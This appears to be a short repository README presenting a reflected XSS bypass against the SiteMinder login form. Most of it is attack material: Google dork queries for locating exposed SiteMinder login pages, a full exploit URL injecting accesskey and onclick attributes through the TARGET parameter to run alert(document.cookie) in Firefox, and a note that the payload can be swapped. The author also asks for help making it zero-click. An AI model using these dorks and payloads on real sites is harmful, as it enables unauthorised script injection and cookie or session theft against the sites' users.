# SiteMinder-XSS-Bypass
SiteMinder-XSS-Bypass Currently Firefox Only


# Google Dork
inurl:"/siteminderagent/forms/login.fcc/type=1"
inurl:"/siteminderagent/forms/login.fcc"

# Steps to Reproduce
Head to:
https://domain.com/siteminderagent/forms/login.fcc?TYPE=33554433&REALMOID=06-0004e7e8-db7f-1c9e-8414-05d40addb054&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-fz2ESNZEvYjpzEaC%2BTgmXd60Uq15eYWRSO5pNMfLZwSEEr8sDpJyEJmjm1qqHC7m&TARGET="accesskey%3d"x"onclick%3d"alert(document.cookie)"

Then Press ALT + SHIFT + X
(Only Works on Firefox due to the payload.)

Payload Used: "accesskey%3d"x"onclick%3d"alert(origin)"

The payload can be changed to alert anything such as document.domain, document.cookie, undefined, and so forth.
If anyone has any ideas how to change the payload to a 0 Click RXSS that works on both Chrome and Firefox contact me on my twitter:
Twitter:https://x.com/Shad0wH3x
